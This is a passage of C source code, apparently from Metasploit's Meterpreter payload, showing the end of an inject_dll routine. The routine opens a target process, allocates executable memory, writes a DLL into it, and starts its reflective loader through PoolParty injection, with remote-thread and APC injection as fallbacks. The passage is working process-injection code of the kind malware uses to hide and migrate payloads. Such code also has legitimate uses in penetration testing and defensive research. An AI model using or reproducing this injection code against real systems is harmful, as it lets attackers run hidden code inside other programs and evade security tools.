			dprintf("[INJECT] inject_dll. Overriding ReflectiveLoader offset with supplied value: 0x%08X", dwActualReflectiveLoaderOffset);
			dwReflectiveLoaderOffset = dwActualReflectiveLoaderOffset;
		}
		if (!dwReflectiveLoaderOffset)
			BREAK_WITH_ERROR("[INJECT] inject_dll. GetReflectiveLoaderOffset failed.", ERROR_INVALID_FUNCTION);

		hProcess = met_api->win_api.kernel32.OpenProcess(PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid);
		if (!hProcess)
			BREAK_ON_ERROR("[INJECT] inject_dll. OpenProcess failed.");

		if (lpArg)
		{
			if (stArgSize)
			{
				// alloc some space and write the argument which we will pass to the injected dll...
				lpRemoteArg = met_api->win_api.kernel32.VirtualAllocEx(hProcess, NULL, stArgSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
				if (!lpRemoteArg)
					BREAK_ON_ERROR("[INJECT] inject_dll. VirtualAllocEx 1 failed");

				if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, lpRemoteArg, lpArg, stArgSize, NULL))
					BREAK_ON_ERROR("[INJECT] inject_dll. WriteProcessMemory 1 failed");
			}
			else
			{
				// if only lpArg is specified, pass it as-is without allocating space for it and copying the contents
				lpRemoteArg = lpArg;
			}
		}

		// alloc memory (RWX) in the host process for the image...
		lpRemoteLibraryBuffer = met_api->win_api.kernel32.VirtualAllocEx(hProcess, NULL, dwDllLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!lpRemoteLibraryBuffer)
			BREAK_ON_ERROR("[INJECT] inject_dll. VirtualAllocEx 2 failed");

		// write the image into the host process...
		if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpDllBuffer, dwDllLength, NULL))
			BREAK_ON_ERROR("[INJECT] inject_dll. WriteProcessMemory 2 failed");

		// add the offset to ReflectiveLoader() to the remote library address...
		lpReflectiveLoader = (LPVOID)((DWORD_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);

		// First we try to inject by directly creating a remote thread in the target process
		if (bPoolParty) {
			dwResult = inject_via_poolparty(NULL, NULL, hProcess, dwDestinationArch, lpReflectiveLoader, lpRemoteArg);
			if (dwResult != ERROR_SUCCESS) {
				dprintf("[INJECT] inject_via_poolparty failed, proceeding with legacy injection.");
				// Reset dwResult and set bPoolParty to FALSE.
				dwResult = ERROR_SUCCESS;
				bPoolParty = FALSE;
			}
		
		}

		if (!bPoolParty) {
			if (inject_via_remotethread(NULL, NULL, hProcess, dwDestinationArch, lpReflectiveLoader, lpRemoteArg) != ERROR_SUCCESS)
			{
				dprintf("[INJECT] inject_dll. inject_via_remotethread failed, trying inject_via_apcthread...");

				// If that fails we can try to migrate via a queued APC in the target process
				if (inject_via_apcthread(NULL, NULL, hProcess, dwPid, dwDestinationArch, lpReflectiveLoader, lpRemoteArg) != ERROR_SUCCESS)
					BREAK_ON_ERROR("[INJECT] inject_dll. inject_via_apcthread failed")
			}
		}

		dwResult = ERROR_SUCCESS;

	} while (0);

	if (hProcess)
		met_api->win_api.kernel32.CloseHandle(hProcess);

	return dwResult;
}
